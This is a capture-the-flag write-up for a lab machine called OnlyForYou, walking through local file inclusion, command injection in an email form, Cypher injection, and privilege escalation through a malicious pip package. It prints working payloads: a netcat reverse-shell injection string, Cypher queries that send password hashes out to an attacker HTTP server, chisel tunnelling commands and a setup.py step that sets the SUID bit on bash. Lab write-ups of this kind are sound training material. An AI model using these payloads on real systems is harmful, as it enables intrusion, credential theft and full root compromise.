# OnlyForYou

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.84.140
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 23:07 EDT
Nmap scan report for 10.129.84.140
Host is up (0.0072s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Web Exploit for RCE it seems. We have to add `only4you.htb` to our `/etc/hosts` file to view the website.

### Only4You Beta

Port 80 is hosting a corporate website.

<figure><img src="../../.gitbook/assets/image (3094).png" alt=""><figcaption></figcaption></figure>

At the very bottom, it seems that we can download a trial of their application. This redirects us to the `beta.only4you.htb` domain.

<figure><img src="../../.gitbook/assets/image (3336).png" alt=""><figcaption></figcaption></figure>

The subdomain shows us this site where we can view source code.

<figure><img src="../../.gitbook/assets/image (3283).png" alt=""><figcaption></figcaption></figure>

I'm assuming that this is the source code for the Resizer and Converter application that is present in the corner. When we download the source code, there is an `app.py` and `tool.py` file that we have to analyse.

Within the `app.py` function, there's a `/download` function that checks for LFI.

```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

This LFI protection looks rather weak, so let's try to read `/etc/passwd`.

```
$ curl -X POST 'http://beta.only4you.htb/download' -d 'image=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
```

This works! So we have LFI, and the rest of the code for `app.py` and `tool.py` look rather uninteresting. Instead, I tried to read the application files for the main website. Since the beta website is Flask based, I assumed the main website was Flask based as well. We can find the `app.py` file in `/var/www/only4you.htb/app.py`.

```python
$ curl -X POST 'http://beta.only4you.htb/download' -d 'image=/var/www/only4you.htb/app.py'
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

So the main website takes a message and directly sends it elsewhere. Since it imports the `form` module, let's read `form.py`.

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

Long code, but basically `insecure` checks for certain characters within the message we send, and afterwards send an email to somewhere else.&#x20;

The vulnerability lies here: `result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)`. This takes the domain part of the email without sanitisation and inserts it into a command. We can easily get RCE using `|`. By sending this query, I got a shell as `www-data`.

```http
POST / HTTP/1.1
Host: only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://only4you.htb
Connection: close
Referer: http://only4you.htb/
Upgrade-Insecure-Requests: 1



name=test&email=test%40website.com+|+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.5+4444+>/tmp/f&subject=test&message=test
```

<figure><img src="../../.gitbook/assets/image (1583).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

There are 2 main users within the machine, `dev` and `john`. We don't have access to them at all.&#x20;

### Port Fowarding

Within the `/opt` directory, there is a directory owned by `dev`, which I assume is the next user to exploit.

```
www-data@only4you:/opt$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Dec  8 20:56 .
drwxr-xr-x 17 root root 4096 Mar 30 11:51 ..
drwxr-----  6 dev  dev  4096 Apr 27 03:25 gogs
drwxr-----  6 dev  dev  4096 Mar 30 11:51 internal_app
```

By running `netstat -tulpn`, there are more ports open on the server.

```
www-data@only4you:/opt$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1024/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Most notably, there's `neo4j` running on port 7687. Also, there's another HTTP server on port 8001. We can do port forwarding with `chisel` easily.

```bash
# on kali
chisel server -p 5555 --reverse
# on victim
./chisel client 10.10.14.5:5555 R:1080:socks
```

Trying to use `proxychains` with Firefox didn't really work for some reason, so I changed the command to only forward port 8001.&#x20;

### Neo4j Injection

Port 8001 was another login page:

<figure><img src="../../.gitbook/assets/image (1847).png" alt=""><figcaption></figcaption></figure>

I tried some weak credentials, and found that `admin:admin` worked. This was some sort of dashboard with sales and stuff.

<figure><img src="../../.gitbook/assets/image (3299).png" alt=""><figcaption></figcaption></figure>

Within the Employees tab, we can search for the names of employees.

<figure><img src="../../.gitbook/assets/image (960).png" alt=""><figcaption></figcaption></figure>

There's the port for `neo4j` open on the machine, so I assumed that some kind of query injection was next. Also, we can see the Tasks on the main dashboard page to verify this.

<figure><img src="../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

As usual, Hacktricks has a whole page to get us started.

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j" %}

The injection via `neo4j` seems to work via sending a HTTP requests with the output to an external server. We can first use this command to extract some information about the database and its labels.

{% code overflow="wrap" %}
```
'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.5:5000/?label='+label as l RETURN 0 as _0 //

$ python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=user HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=employee HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=user HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=employee HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=user HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=employee HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=user HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=employee HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=user HTTP/1.1" 200 -
10.129.84.140 - - [26/Apr/2023 23:44:27] "GET /?label=employee HTTP/1.1" 200 -
```
{% endcode %}

Great! We have confirmed that we have injection. Now, we can try to extract hashes from the `user` part of the database. Using this command, we can extract the hashes of the users!

```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.5:5000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

<figure><img src="../../.gitbook/assets/image (1653).png" alt=""><figcaption></figcaption></figure>

We can crack these hashes on CrackStation.

<figure><img src="../../.gitbook/assets/image (1273).png" alt=""><figcaption></figcaption></figure>

With this password, we can `ssh` in as `john`! Then, we can grab the user flag.

### Gogs and Sudo --> Root

Since we have the password of the user, we can check `sudo` privileges.

```
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

Obviously, there's a wildcard here and it is vulnerable. Now, this was using port 3000, and we should try to port forward that. Doing so would reveal that port 3000 is running a Gogs server.

<figure><img src="../../.gitbook/assets/image (1982).png" alt=""><figcaption></figcaption></figure>

Checking the repository, we can see that `john` is a user on the service. We can reuse the password we found earlier to login. Afterwards, we can create repositories on this.

<figure><img src="../../.gitbook/assets/image (1412).png" alt=""><figcaption></figcaption></figure>

Since this exploit involved using `pip3 download`, we can search for exploits regarding that. Here's a good resource I found:

{% embed url="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/" %}

The exploit details how we have to create a malicious repository on this Gogs instance and use `pip3` to download and run malicious code. The author of the article above shared his PoC repository, which we can download and modify.

{% embed url="https://github.com/wunderwuzzi23/this_is_fine_wuzzi/" %}

I just modifed the `setup.py` file to run `os.system("chmod u+s /bin/bash")`. Afterwards, we need to build the package using `python3 -m build`. Afterwards, we need to upload the file. I created a new repository on the Gogs instance and uploaded it there.

<figure><img src="../../.gitbook/assets/image (1711).png" alt=""><figcaption></figcaption></figure>

Then, we can just run the command to download it.

<figure><img src="../../.gitbook/assets/image (3785).png" alt=""><figcaption></figcaption></figure>

We can easily get a root shell at this point.&#x20;
